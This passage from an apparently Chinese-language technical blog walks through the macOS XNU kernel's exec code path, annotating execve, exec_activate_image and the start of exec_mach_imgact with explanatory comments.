exit_with_error;</span><br><span class="line">	&#125;</span><br><span class="line">  	//通过数据结构size的偏移，指向对应的内存空间</span><br><span class="line">  	//imgp,vap,origvap实际是连续的一块内存</span><br><span class="line">	vap = (struct vnode_attr *) (bufp + sizeof(*imgp));</span><br><span class="line">	origvap = (struct vnode_attr *) (bufp + sizeof(*imgp) + sizeof(*vap));</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Initialize the common data in the image_params structure */</span></span><br><span class="line">	//初始化数据</span><br><span class="line">  	imgp-&gt;ip_user_fname = uap-&gt;fname;</span><br><span class="line">	imgp-&gt;ip_user_argv = uap-&gt;argp;</span><br><span class="line">	imgp-&gt;ip_user_envv = uap-&gt;envp;</span><br><span class="line">	imgp-&gt;ip_vattr = vap;</span><br><span class="line">	imgp-&gt;ip_origvattr = origvap;</span><br><span class="line">	imgp-&gt;ip_vfs_context = &amp;context;</span><br><span class="line">	imgp-&gt;ip_flags = (is_64 ? IMGPF_WAS_64BIT : IMGPF_NONE) | ((p-&gt;p_flag &amp; P_DISABLE_ASLR) ? IMGPF_DISABLE_ASLR : IMGPF_NONE);</span><br><span class="line">	imgp-&gt;ip_seg = (is_64 ? UIO_USERSPACE64 : UIO_USERSPACE32);</span><br><span class="line">	imgp-&gt;ip_mac_return = 0;</span><br><span class="line"></span><br><span class="line">  	//设置线程信息</span><br><span class="line">	uthread = get_bsdthread_info(current_thread());</span><br><span class="line">	if (uthread-&gt;uu_flag &amp; UT_VFORK) &#123;</span><br><span class="line">		imgp-&gt;ip_flags |= IMGPF_VFORK_EXEC;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	//MAC模块相应的处理，与进程的权限相关</span><br><span class="line">  	//MAC:https://www.freebsd.org/doc/handbook/mac.html</span><br><span class="line">#if CONFIG_MACF</span><br><span class="line">	if (uap-&gt;mac_p != USER_ADDR_NULL) &#123;</span><br><span class="line">		error = mac_execve_enter(uap-&gt;mac_p, imgp);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">			goto exit_with_error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">#endif</span><br><span class="line">	</span><br><span class="line">  	//执行image</span><br><span class="line">	error = exec_activate_image(imgp);</span><br><span class="line"></span><br><span class="line">  	//释放资源与出错处理</span><br><span class="line">	kauth_cred_unref(&amp;context.vc_ucred);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Image not claimed by any activator? */</span></span><br><span class="line">	if (error == -1)</span><br><span class="line">		error = ENOEXEC;</span><br><span class="line">	<span class="comment">/*...*/</span>	</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
<p>主要就是进行了一些数据结构的初始化已经权限的判断，资源的获取与释放，主要逻辑在<code>exec_activate_image</code>中。</p>
<h2 id="1-2_exec_activate_image">1.2 exec_activate_image</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * exec_activate_image</span><br><span class="line"> *</span><br><span class="line"> * Description:	Iterate through the available image activators, and activate</span><br><span class="line"> *		the image associated with the imgp structure.  We start with</span><br><span class="line"> *		the</span><br><span class="line"> *</span><br><span class="line"> * Parameters:	struct image_params *	Image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	0			Success</span><br><span class="line"> *		EBADEXEC		The executable is corrupt/unknown</span><br><span class="line"> *	execargs_alloc:EINVAL		Invalid argument</span><br><span class="line"> *	execargs_alloc:EACCES		Permission denied</span><br><span class="line"> *	execargs_alloc:EINTR		Interrupted function</span><br><span class="line"> *	execargs_alloc:ENOMEM		Not enough space</span><br><span class="line"> *	exec_save_path:EFAULT		Bad address</span><br><span class="line"> *	exec_save_path:ENAMETOOLONG	Filename too long</span><br><span class="line"> *	exec_check_permissions:EACCES	Permission denied</span><br><span class="line"> *	exec_check_permissions:ENOEXEC	Executable file format error</span><br><span class="line"> *	exec_check_permissions:ETXTBSY	Text file busy [misuse of error code]</span><br><span class="line"> *	exec_check_permissions:???</span><br><span class="line"> *	namei:???</span><br><span class="line"> *	vn_rdwr:???			[anything vn_rdwr can return]</span><br><span class="line"> *	&lt;ex_imgact&gt;:???			[anything an imgact can return]</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="title">exec_activate_image</span><span class="params">(<span class="keyword">struct</span> image_params *imgp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> nameidata *ndp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *excpath;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> resid;</span><br><span class="line">	<span class="keyword">int</span> once = <span class="number">1</span>;	<span class="comment">/* save SGUID-ness for interpreted files */</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> itercount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">proc_t</span> p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">	error = execargs_alloc(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	</span><br><span class="line">	error = exec_save_path(imgp, imgp-&gt;ip_user_fname, imgp-&gt;ip_seg, &amp;excpath);</span><br><span class="line">	<span class="keyword">if</span> (error) &#123;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Use excpath, which contains the copyin-ed exec path */</span></span><br><span class="line">	DTRACE_PROC1(exec, <span class="keyword">uintptr_t</span>, excpath);</span><br><span class="line"></span><br><span class="line">	MALLOC(ndp, <span class="keyword">struct</span> nameidata *, <span class="keyword">sizeof</span>(*ndp), M_TEMP, M_WAITOK | M_ZERO);</span><br><span class="line">	<span class="keyword">if</span> (ndp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		error = ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	NDINIT(ndp, LOOKUP, OP_LOOKUP, FOLLOW | LOCKLEAF | AUDITVNPATH1,</span><br><span class="line">		   UIO_SYSSPACE, CAST_USER_ADDR_T(excpath), imgp-&gt;ip_vfs_context);</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line">	error = namei(ndp); <span class="comment">//<span class="doctag">todo:</span>	详细流程先不看，研究下来感觉是路径的搜索</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	imgp-&gt;ip_ndp = ndp;	<span class="comment">/* successful namei(); call nameidone() later */</span></span><br><span class="line">	imgp-&gt;ip_vp = ndp-&gt;ni_vp;	<span class="comment">/* if set, need to vnode_put() at some point */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Before we start the transition from binary A to binary B, make</span><br><span class="line">	 * sure another thread hasn't started exiting the process.  We grab</span><br><span class="line">	 * the proc lock to check p_lflag initially, and the transition</span><br><span class="line">	 * mechanism ensures that the value doesn't change after we release</span><br><span class="line">	 * the lock.</span><br><span class="line">	 */</span></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;p_lflag &amp; P_LEXIT) &#123;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line">	&#125;</span><br><span class="line">	error = proc_transstart(p, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad_notrans;</span><br><span class="line"></span><br><span class="line">	error = exec_check_permissions(imgp);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy; avoid invocation of an interpreter overwriting the original */</span></span><br><span class="line">	<span class="keyword">if</span> (once) &#123;</span><br><span class="line">		once = <span class="number">0</span>;</span><br><span class="line">		*imgp-&gt;ip_origvattr = *imgp-&gt;ip_vattr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//读取数据到内存中</span></span><br><span class="line">	error = vn_rdwr(UIO_READ, imgp-&gt;ip_vp, imgp-&gt;ip_vdata, PAGE_SIZE, <span class="number">0</span>,</span><br><span class="line">			UIO_SYSSPACE, IO_NODELOCKED,</span><br><span class="line">			vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">			&amp;resid, vfs_context_proc(imgp-&gt;ip_vfs_context));</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (resid) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(imgp-&gt;ip_vdata + (PAGE_SIZE - resid), <span class="number">0x0</span>, resid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//到这里之前的代码主要做了两件事情</span></span><br><span class="line">  	<span class="comment">//1.根据路径查找文件</span></span><br><span class="line">  	<span class="comment">//2.将文件拷贝到内存中</span></span><br><span class="line">encapsulated_binary:</span><br><span class="line">	<span class="comment">/* Limit the number of iterations we will attempt on each binary */</span></span><br><span class="line">	<span class="keyword">if</span> (++itercount &gt; EAI_ITERLIMIT) &#123;</span><br><span class="line">		error = EBADEXEC;</span><br><span class="line">		<span class="keyword">goto</span> bad;</span><br><span class="line">	&#125;</span><br><span class="line">	error = -<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; error == -<span class="number">1</span> &amp;&amp; execsw[i].ex_imgact != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">		<span class="comment">//这里对macho文件进行了解析</span></span><br><span class="line">		error = (*execsw[i].ex_imgact)(imgp);	<span class="comment">//<span class="doctag">todo:</span>调用了一个指针函数，exec_mach_imgact</span></span><br><span class="line">      	<span class="comment">//总共有三种函数</span></span><br><span class="line">      	<span class="comment">/*</span><br><span class="line">        struct execsw &#123;</span><br><span class="line">		int (*ex_imgact)(struct image_params *);</span><br><span class="line">		const char *ex_name;</span><br><span class="line">		&#125; execsw[] = &#123;</span><br><span class="line">		&#123; exec_mach_imgact,		"Mach-o Binary" &#125;,</span><br><span class="line">		&#123; exec_fat_imgact,		"Fat Binary" &#125;,</span><br><span class="line">		&#123; exec_shell_imgact,		"Interpreter Script" &#125;,</span><br><span class="line">		&#123; NULL, NULL&#125;</span><br><span class="line">&#125;;</span><br><span class="line">*/</span></span><br><span class="line">      	<span class="comment">//分别是osx支持的三种不同的可执行文件</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (error) &#123;</span><br><span class="line">            <span class="comment">/*出错处理*/</span></span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Call out to allow 3rd party notification of exec. </span><br><span class="line">	 * Ignore result of kauth_authorize_fileop call.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> &amp;&amp; kauth_authorize_fileop_has_listeners()) &#123;</span><br><span class="line">		kauth_authorize_fileop(vfs_context_ucred(imgp-&gt;ip_vfs_context),</span><br><span class="line">					KAUTH_FILEOP_EXEC,</span><br><span class="line">					(<span class="keyword">uintptr_t</span>)ndp-&gt;ni_vp, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	proc_transend(p, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bad_notrans:</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_strings)</span><br><span class="line">		execargs_free(imgp);</span><br><span class="line">	<span class="keyword">if</span> (imgp-&gt;ip_ndp)</span><br><span class="line">		nameidone(imgp-&gt;ip_ndp);</span><br><span class="line">	<span class="keyword">if</span> (ndp)</span><br><span class="line">		FREE(ndp, M_TEMP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数主要做的事情就是寻找并拷贝<strong>可执行文件</strong>到内存中，并且根据可执行文件的类型调用不同的解析函数。osx总共支持三种可执行文件。他们各自有对应的处理函数。</p>
<ul>
<li><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o</a>：exec_mach_imgact</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E4%BA%8C%E8%BF%9B%E5%88%B6" target="_blank" rel="external">Fat Binary</a>：exec_fat_imgact</li>
<li>Interpreter Script：exec_shell_imgact</li>
</ul>
<h2 id="1-3_exec_mach_imgact">1.3 exec_mach_imgact</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * exec_mach_imgact</span><br><span class="line"> *</span><br><span class="line"> * Image activator for mach-o 1.0 binaries.</span><br><span class="line"> *</span><br><span class="line"> * Parameters;	struct image_params *	image parameter block</span><br><span class="line"> *</span><br><span class="line"> * Returns:	-1			not a fat binary (keep looking)</span><br><span class="line"> *		-2			Success: encapsulated binary: reread</span><br><span class="line"> *		&gt;0			Failure: error number</span><br><span class="line"> *		EBADARCH		Mach-o binary, but with an unrecognized</span><br><span class="line"> *					architecture</span><br><span class="line"> *		ENOMEM			No memory for child process after -</span><br><span class="line"> *					can only happen after vfork()</span><br><span class="line"> *</span><br><span class="line"> * Important:	This image activator is NOT byte order neutral.</span><br><span class="line"> *</span><br><span class="line"> * Note:	A return value other than -1 indicates subsequent image</span><br><span class="line"> *		activators should not be given the opportunity to attempt</span><br><span class="line"> *		to activate the image.</span><br><span class="line"> *</span><br><span class="line"> * TODO:	More gracefully handle failures after vfork</span><br><span class="line"> */</span><br><span class="line">static int</span><br><span class="line">exec_mach_imgact(struct image_params *imgp)</span><br><span class="line">&#123;</span><br><span class="line">	struct mach_header *mach_header = (struct mach_header *)imgp-&gt;ip_vdata;</span><br><span class="line">	proc_t			p = vfs_context_proc(imgp-&gt;ip_vfs_context);</span><br><span class="line">	int			error = 0;</span><br><span class="line">	task_t			task;</span><br><span class="line">	task_t			new_task = NULL; /* protected by vfexec */</span><br><span class="line">	thread_t		thread;</span><br><span class="line">	struct uthread		*uthread;</span><br><span class="line">	vm_map_t old_map = VM_MAP_NULL;</span><br><span class="line">	vm_map_t map;</span><br><span class="line">	load_return_t		lret;</span><br><span class="line">	load_result_t		load_result;</span><br><span class="line">	struct _posix_spawnattr *psa = NULL;</span><br><span class="line">	int			spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span 